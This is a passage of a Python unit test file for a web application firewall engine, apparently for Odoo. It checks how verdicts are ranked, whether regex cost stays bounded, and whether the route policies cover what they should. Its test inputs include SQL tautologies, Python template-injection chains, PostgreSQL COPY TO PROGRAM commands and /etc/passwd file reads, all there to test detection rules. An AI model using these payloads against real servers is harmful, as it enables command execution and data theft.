        self.assertIsNone(engine.evaluate(
            snap, dict(unv, path="/web/dataset/call_kw/x")))
        # PARSED evidence that contradicts the policy still never matches:
        # "match" covers missing fields only, it does not override truth
        self.assertIsNone(engine.evaluate(
            snap, dict(unv, rpc={"fields": {"service": "object"},
                                 "unverified": True})))
        # no unverified marker at all (no body / body fully parsed garbage):
        # still no evidence -> no decision (fail open as before)
        self.assertIsNone(engine.evaluate(
            snap, dict(unv, rpc={"fields": {}})))

    # ------------------------------------------- round 13 F02: verdict tiers

    TAUT_RULE = {"id": 91, "code": "waf-sqli-taut-b",
                 "name": "SQL boolean tautology", "category": "sqli",
                 "scope": "body",
                 "pattern": r"\b(?:or|and)\b\s+['\"]?\d+['\"]?\s*="
                           r"\s*['\"]?\d+",
                 "action": "block", "severity": 4, "no_session": False,
                 "case_sensitive": False}

    def _reset_req(self, body="login=or 1=1"):
        # body-scope rules match req["norm_body"] exactly as the
        # middleware hands it over (raw + parser-parity candidates)
        return {"ip": "203.0.113.9", "method": "POST", "uid": None,
                "path": "/web/reset_password", "query": "", "ua": "",
                "norm_body": [normalize(body, decode_plus=True)]}

    def test_signature_block_survives_a_severer_rate_policy(self):
        # review 13-F02: a rate-GATED policy block is a refusal that has
        # not happened yet -- its counter is still under the limit -- so
        # it must not be ranked against an immediate signature block by
        # nominal severity. The reviewer's shape: the bundled reset-flood
        # policy raised to severity 5 became the decision, and below its
        # 10-per-10-min threshold the middleware allowed a request the
        # SQL-tautology signature had already condemned.
        for sev in (1, 3, 4, 5, 9):
            snap = self._snap(
                rules=[dict(self.TAUT_RULE)],
                policies=[self._pol(id=92, code="ep-reset-ip",
                                    route_re=r"^/web/reset_password$",
                                    methods="POST", severity=sev,
                                    rate_max=10, rate_window=10,
                                    rate_key="ip")])
            d = engine.evaluate(snap, self._reset_req(), counters={})
            self.assertEqual(d["kind"], "rule",
                             "a severity-%d flood policy must not outvote "
                             "the signature" % sev)
            self.assertEqual(d["action"], "block")
            self.assertEqual(d["rule_code"], "waf-sqli-taut-b")
            self.assertEqual(len(d.get("rates", [])), 1,
                             "the flood counter keeps ticking anyway "
                             "(severity-%d policy)" % sev)

    def test_two_verdicts_in_effect_still_rank_by_severity(self):
        # the tiers must not flatten severity: an UNTHROTTLED policy block
        # is in effect on sight, so with both verdicts live the stronger
        # one still names the decision and the traffic log.
        pol_strong = self._pol(id=93, code="ep-reset-hard",
                               route_re=r"^/web/reset_password$",
                               methods="POST", severity=9, rate_max=0)
        d = engine.evaluate(self._snap(rules=[dict(self.TAUT_RULE)],
                                       policies=[pol_strong]),
                            self._reset_req(), counters={})
        self.assertEqual(d["kind"], "endpoint")
        self.assertTrue(d["block_unconditional"])
        self.assertEqual(d["rule_code"], "ep-reset-hard")
        # ... and with the policy weaker, the signature still names it
        pol_weak = self._pol(id=94, code="ep-reset-soft",
                             route_re=r"^/web/reset_password$",
                             methods="POST", severity=2, rate_max=0)
        d = engine.evaluate(self._snap(rules=[dict(self.TAUT_RULE)],
                                       policies=[pol_weak]),
                            self._reset_req(), counters={})
        self.assertEqual(d["kind"], "rule")

    def test_logging_signature_never_outranks_a_flood_refusal(self):
        # the other side of the same combine: a signature that only LOGS
        # must not become the decision over a blocking flood policy, or a
        # flood would lose its refusal the moment one of its own requests
        # also happens to trip a benign-looking rule.
        snap = self._snap(
            rules=[dict(self.TAUT_RULE, action="log", severity=5)],
            policies=[self._pol(id=95, code="ep-reset-ip2",
                                route_re=r"^/web/reset_password$",
                                methods="POST", severity=3,
                                rate_max=10, rate_window=10,
                                rate_key="ip")])
        d = engine.evaluate(snap, self._reset_req(), counters={})
        self.assertEqual(d["kind"], "endpoint")
        self.assertEqual(d["action"], "block")
        self.assertFalse(d.get("block_unconditional"))
        self.assertTrue(d.get("rates"))

    def test_broken_policy_and_exception_skipped_not_fatal(self):
        snap = self._snap(
            policies=[self._pol(id=20, route_re="([unclosed")],
            exceptions=[{"id": 3, "rule_id": None, "rule_code": None,
                         "policy_id": 20, "policy_code": None,
                         "route_re": "([unclosed", "methods": "", "param": "",
                         "reason": "bad regex", "expires": None}])
        self.assertEqual(snap["policies"], [])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                   "path": "/web/database/x", "query": "",
                                   "ua": ""})
        self.assertIsNone(d)
        self.assertIsNone(engine.evaluate(
            self._snap(exceptions=[{"id": 4, "rule_id": None,
                                    "rule_code": None, "policy_id": None,
                                    "policy_code": None, "route_re": "",
                                    "methods": "", "param": "",
                                    "reason": "no target", "expires": None}]),
            {"ip": "9.9.9.9", "method": "GET", "path": "/x", "query": "",
             "ua": ""}))

    # ------------------------------------------- bundled python/pg signature pack

    def _rule_row(self, rule_id):
        rows = {r.get("id"): r for r in self.env["waf.rule"]._read_builtin_rules()}
        rule = rows[rule_id]
        return {"id": 950, "code": rule["id"], "name": rule["name"],
                "category": rule["category"], "scope": rule["scope"],
                "pattern": rule["pattern"], "action": rule["action"],
                "severity": rule["severity"],
                "no_session": bool(rule.get("no_session", True)),
                "case_sensitive": False}

    def test_python_chain_blocks_lone_dunders_log_only(self):
        chain = self._snap(rules=[self._rule_row("waf-ssti-py-chain-q")])
        attr = self._snap(rules=[self._rule_row("waf-ssti-py-attr-q")])

        def check(snap, q):
            return engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                          "path": "/x", "query": q, "ua": ""})

        for q in ("__class__ __mro__", "__mro__.__subclasses__",
                  "__subclasses__()", "__globals__[x]",
                  "__builtins__ __import__", "__import__('os')"):
            d = check(chain, q)
            self.assertTrue(d and d["action"] == "block", q)
        # ambiguous singletons: visible, never refused (docs, server
        # actions, admin-authored templates contain these)
        for q in ("__class__", "__globals__", "__mro__", "__builtins__",
                  "__import__"):
            d = check(chain, q)
            self.assertIsNone(d, q)
            d = check(attr, q)
            self.assertTrue(d and d["action"] == "log", q)
        # ordinary business text must not even log
        self.assertIsNone(check(attr, "product.classification=global"))

    def test_qweb_directives_extended(self):
        qweb = self._snap(rules=[self._rule_row("waf-ssti-qweb-q")])
        for q in ('q=<t t-call="x"/>', 'q=<t t-att-href="u"/>',
                  'q=<t t-attf="/a/{{b}}"/>', 'q=<t t-translation="none"/>'):
            d = engine.evaluate(qweb, {"ip": "9.9.9.9", "method": "GET",
                                       "path": "/x", "query": q, "ua": ""})
            self.assertTrue(d and d["action"] == "block", q)

    def test_pg_copy_program_blocks_role_name_logs(self):
        copy = self._snap(rules=[self._rule_row("waf-pg-copy-program-q")])
        role = self._snap(rules=[self._rule_row("waf-pg-server-program-q")])
        files = self._snap(rules=[self._rule_row("waf-sqli-files-q")])

        def check(snap, q):
            return engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                          "path": "/x", "query": q, "ua": ""})

        for q in ("1 copy users to program 'id'",
                  "COPY (SELECT 1) TO PROGRAM 'touch /tmp/x'",
                  "copy x from program"):
            d = check(copy, q)
            self.assertTrue(d and d["action"] == "block", q)
        # the privilege/role name alone: log only (DBA docs, migrations)
        d = check(copy, "GRANT pg_execute_server_program TO analyst")
        self.assertIsNone(d)
        d = check(role, "GRANT pg_execute_server_program TO analyst")
        self.assertTrue(d and d["action"] == "log")
        # file-read parity: binary variant covered too
        for q in ("pg_read_binary_file('/etc/passwd')",
                  "pg_read_file('x')"):
            d = check(files, q)
            self.assertTrue(d and d["action"] == "block", q)

    def test_new_signature_patterns_cost_bounded(self):
        # review: "keep regex execution bounded. Test long, non-matching
        # input as well." The gap classes are all {0,64}-style bounded, so
        # adversarial filler over the full 64 KB body cap stays ~linear.
        worst = 0.0
        cases = {
            "waf-ssti-py-chain-q": "__class__" * 30000,
            # every start position IS word-boundary-valid: the bounded gap
            # class, not the scan starts, is what must keep this linear
            "waf-pg-copy-program-q": "copy " * 50000,
            "waf-ssti-py-attr-q": "_" * 65534,
        }
        for code, filler in cases.items():
            snap = self._snap(rules=[self._rule_row(code)])
            t0 = time.perf_counter()
            d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                       "path": "/x", "query": filler,
                                       "ua": ""})
            worst = max(worst, time.perf_counter() - t0)
            self.assertTrue(d is None or d["action"] != "block",
                            f"{code}: filler must not match")
        self.assertLess(worst, 0.25,
                        "inspection cost must stay bounded/~linear")

    def test_widened_decoded_scan_cost_stays_bounded(self):
        # review 13-F01 closed an eviction hole by letting the decoded
        # (parser-parity) scan follow the whole RPC capture instead of
        # the signature scan cap. Coverage paid for in CPU is only honest
        # if that CPU stays bounded: the COMPLETE bundled body-signature
        # pack, run over the chunked candidates of a 512 KiB padded
        # envelope, must stay far below a second and must match nothing.
        body_rules = [
            {"id": 950 + i, "code": r["id"], "name": r["name"],
             "category": r["category"], "scope": "body",
             "pattern": r["pattern"], "action": r["action"],
             "severity": r["severity"],
             "no_session": bool(r.get("no_session", True)),
             "case_sensitive": False}
            for i, r in enumerate(self.env["waf.rule"]._read_builtin_rules())
            if r.get("scope") == "body"]
        self.assertGreater(len(body_rules), 10,
                           "the pack really has its body rules")
        snap = self._snap(rules=body_rules)
        envelope = ('{"params":{"args":["' + "a" * 500000 + '","tail"]}}')
        cands = [normalize(c, max_len=65536)
                 for c in middleware._json_chunks(envelope.encode(), 65536)]
        self.assertGreater(len(cands), 5,
                           "the widest capture really arrives chunked")
        t0 = time.perf_counter()
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "POST",
                                   "uid": None,
                                   "path": "/web/dataset/call_kw",
                                   "query": "", "ua": "",
                                   "norm_body": cands})
        took = time.perf_counter() - t0
        self.assertIsNone(d, "filler must not match")
        # measured ~0.1 s on the rig; 1 s leaves CI headroom while still
        # catching anything quadratic (the old QWeb pattern cost ~4 s on
        # 64 KB, and THAT was the DoS)
        self.assertLess(took, 1.0,
                        "decoded scan of the widest capture must stay "
                        "bounded/~linear (this run: %.2f s)" % took)

    def test_builtin_policy_pack_integrity(self):
        # every shipped policy compiles, is anchored or explicit, and the
        # pack really covers the complete route groups the review asked for
        rows = self.env["waf.endpoint.policy"]._read_builtin_policies()
        by_code = {r["id"]: r for r in rows}
        self.assertEqual(len(by_code), len(rows), "duplicate policy codes")
        for row in rows:
            re.compile(row["route"])
        for path in ("/web/database/selector", "/web/database/create",
                     "/web/database/duplicate", "/web/database/drop",
                     "/web/database/backup", "/web/database/restore",
                     "/web/database/change_password", "/web/database/list"):
            self.assertTrue(
                re.search(by_code["waf-ep-dbmanager"]["route"], path), path)
        self.assertTrue(by_code["waf-ep-dbmanager"].get("apply_pre_db"))
        for path in ("/xmlrpc/db", "/xmlrpc/2/db"):
            self.assertTrue(re.search(by_code["waf-ep-xmldb"]["route"], path),
                            path)
        # the web client surface must NOT be covered by any policy
        for row in rows:
            self.assertIsNone(
                re.search(row["route"], "/web/dataset/call_kw"),
                f"{row['id']} must not match /web/dataset")
        self.assertIn("db", by_code["waf-ep-jsonrpc-db"]["rpc_service"])

    def test_body_scan_window_clamped_in_snapshot(self):
        # review round 17 F02: the ORM bounds body_scan_max now, but
        # rows written before the constraint (or by raw SQL) still reach
        # build_snapshot -- and both directions hurt the WSGI hot path:
        # a tiny window made the JSON chunker emit one candidate per
        # character, an absurd one buffers that many bytes per request.
        # Defense in depth: clamp into the snapshot itself.
        self.assertEqual(self._snap(body_scan_max=100)["body_scan_max"],
                         4096)
        self.assertEqual(self._snap(body_scan_max=-5)["body_scan_max"],
                         4096)
        self.assertEqual(self._snap(body_scan_max=5_000_000)["body_scan_max"],
                         1048576)
        self.assertEqual(self._snap(body_scan_max=0)["body_scan_max"],
                         65536, "0/None still mean the documented default")
